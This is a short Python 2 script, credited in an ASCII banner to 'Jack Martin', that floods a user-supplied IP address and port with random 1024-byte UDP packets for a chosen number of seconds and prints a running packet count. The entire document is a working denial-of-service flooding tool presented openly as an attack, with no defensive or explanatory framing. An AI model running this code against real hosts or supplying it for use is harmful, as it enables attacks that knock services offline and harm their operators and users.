print  "___    _   _  _   _  ___    _   _     ___    _       __     __    ___"
print "(  _`\ ( ) ( )( ) ( )(  _`\ ( ) ( )   (  _`\ ( )    /' _`\ /' _`\ (  _`\ "
print "| (_(_)| |_| || | | || (_(_)| `\| |   | (_(_)| |    | ( ) || ( ) || | ) |"
print "|  _)_ |  _  || | | |`\__ \ | , ` |   |  _)  | |  _ | | | || | | || | | )"
print "| (_( )| | | || \_/ |( )_) || |`\ |   | |    | |_( )| (_) || (_) || |_) |"
print "(____/'(_) (_)`\___/'`\____)(_) (_)   (_)    (____/'`\___/'`\___/'(____/'"
print "+==================================+"
print "|    MADE BY :                     | "
print "|        JACK MARTIN               |"
print "+==================================+"

import socket
import random
import time
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
ip = raw_input('Input target ip: ')
port = input('Enter port: ')
duration = input('Number of seconds to attack: ')
timeout = time.time() + duration
sent = 0

while True:
	if time.time() > timeout:
		break
	else:
		pass
	bytes = random._urandom(1024) 
	sock.sendto(bytes,(ip, port))
	sent = sent + 1
	print "Sent %s packets to %s with port %s"%(sent, ip, port)

